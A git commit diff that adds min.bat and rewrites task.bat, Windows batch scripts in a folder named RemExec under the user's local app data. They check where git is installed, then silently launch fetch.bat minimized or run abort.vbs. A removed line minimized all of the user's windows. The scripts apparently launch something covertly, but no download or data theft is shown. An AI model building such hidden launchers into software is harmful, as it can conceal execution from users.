42781da9fe18101c87398406323e33dee365bd07
GVIO <ampleevvlad11@gmail.com>
2024-11-02 20:40:55 +0200

    .

---
+++ min.bat
@@ -0,0 +1,10 @@
+@echo off
+for /F "tokens=*" %%g IN ('where git') do (SET git=%%g)
+cd %localappdata%\Programs\RemExec
+if "%git%"=="C:\Program Files\Git\cmd\git.exe" (
+   start /min fetch.bat
+   exit
+   ) else (
+   start /WAIT abort.vbs
+   exit
+)
--- task.bat
+++ task.bat
@@ -1,11 +1,4 @@
 @echo off
-powershell (New-Object -ComObject Shell.Application).MinimizeAll()
-      for /F "tokens=*" %%g IN ('where git') do (SET git=%%g)
-      cd %localappdata%\Programs\RemExec
-      if "%git%"=="C:\Program Files\Git\cmd\git.exe" (
-      start /min fetch.bat
-      exit
-      ) else (
-   start /WAIT abort.vbs
-   exit
-)
+cd %localappdata%\Programs\RemExec
+start /min min.bat
+exit
